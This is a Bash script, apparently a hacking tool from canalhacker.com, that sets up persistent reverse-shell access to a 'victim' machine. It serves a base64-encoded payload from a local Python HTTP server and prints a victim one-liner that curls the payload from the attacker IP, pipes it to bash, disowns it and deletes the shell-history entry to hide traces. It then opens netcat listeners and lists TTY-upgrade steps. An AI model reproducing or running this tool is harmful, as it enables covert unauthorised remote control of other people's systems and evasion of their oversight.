#!/bin/bash

#Autor: Adrian Ledesma Bello
#Link: https://www.canalhacker.com


function logo {

        echo
        echo -e "\e[37m _______      \e[34m                                                 _____   _________     ______              \e[m"
        echo -e '\e[37m!   ____!      ----       NAL     N       ----       L       \e[34m !  ___) {___   ___}   /""""""\   Y\    /Y '
        echo -e "\e[37m!  |         ==    ==     N \L    N     >>    <<     L       \e[34m | (___      $ $      ()_ __ _()   \Y  Y/  "
        echo -e "\e[37m!  |        >>------<<    N  \L   N    ==------==    L       \e[34m !___  !     $ $      ()_持久_()    Y\/Y   "
        echo -e "\e[37m!  |____   ==        ==   N   \L  N   >>        <<   L       \e[34m  ___) |     $ $      ()      ()     ||    "
        echo -e '\e[37m!_______! ==          ==  N    \LAN  >>          <<  LLLLLLL \e[34m (_____!     $_$      ()      ()     ||    '
        echo -e "\e[0m"

}

function help {

	if [ -z $ip ] || [ -z $port ] || [ -z $portsrv ];then

		echo -e """NOTE: You must be root in the victim machine to create the persistance."""
		echo -e """\e[33mUsage: $0 <Local_ip> <Local_port> <port_srv> <term>"""
		echo -e 'term : When execute the code in the victim machine, open a terminal automaticly (Don`t use with VPS)'
		echo -e """Example: ./canalstay.sh $(hostname -I)1357 80"""
		echo -e """Example: ./canalstay.sh $(hostname -I)1357 80 term"""
		exit

	fi

}

function tty {

	echo -e """\e[1mVICTIM: curl -s http://$ip:$portsrv/.ejec |base64 -d|bash & disown -h \$!;history -d \$(set -- \$(history 1);echo \$1);tput reset\e[0m"""
	echo
	echo -e "\e[37mManage terminal:"
	echo -e """     which python"""
	echo -e """     python -c 'import pty;pty.spawn(\"/bin/bash\")'"""
	echo -e """     <Ctrl+Z>"""
	echo -e """     stty raw -echo;fg"""
	echo -e """     reset"""
	echo -e """     export TERM=xterm;export SHELL=bash; stty rows $(stty size | awk '{print $1}') columns $(stty size | awk '{print $2}')\e[0m"""
	echo

}

function backserver {

	if [ $(ps -aux | grep "python -m SimpleHTTPServer $portsrv" | grep -v "grep" | wc -c) -gt 10 ];then

		read -p "You have another server with this port $portsrv, do you want kill him? (y/n): " x
		echo

		if [ "$x" == "y" ];then

			kill $(ps -aux | grep "python -m SimpleHTTPServer $portsrv" | grep -v "grep" | awk '{print $2}')
			rm `pwd`/.code/.srv_$portsrv 2>/dev/null

		fi

	fi

}

function term {

	if [ "$tm" == "term" ];then

		gnome-terminal -- "nc -nlvp $port"

	fi

}

function check_server {

	while true;do

		sleep 0.55221144
		if [ $(cat .srv_$portsrv | tail -n 2 | grep C4Na1hAk3r | wc -c) -gt 10 ];then
			echo "----" >> .srv_$portsrv
			echo "----" >> .srv_$portsrv
			break
		fi

	done

}

function bc {

        while true;do

                echo "cat ../.persis | sed 's/ip_/"$ip"/g' | sed 's/port_/"$port"/g' | sed 's/portsrv_/"$portsrv"/g'" | bash | base64 > .ejec
                check_server
                term
                echo -e "\e[33m[*]\e[m OPEN port $port"
                let port=$port+10;

        done

}

################ MAIN

ip=$1
port=$2
portsrv=$3
tm=$4

logo
help
backserver
tty

cd `pwd`/.code
python -m SimpleHTTPServer $portsrv 2> .srv_$portsrv & disown -h $!
echo "Server with python running in background, port: $port"
echo 'If you want stop the persistence, execute this command in the remote machine with only one session opened: ./clear_per_linux.sh & disown -h $!;exit'
echo "[] Waiting fof conexions..."
bc
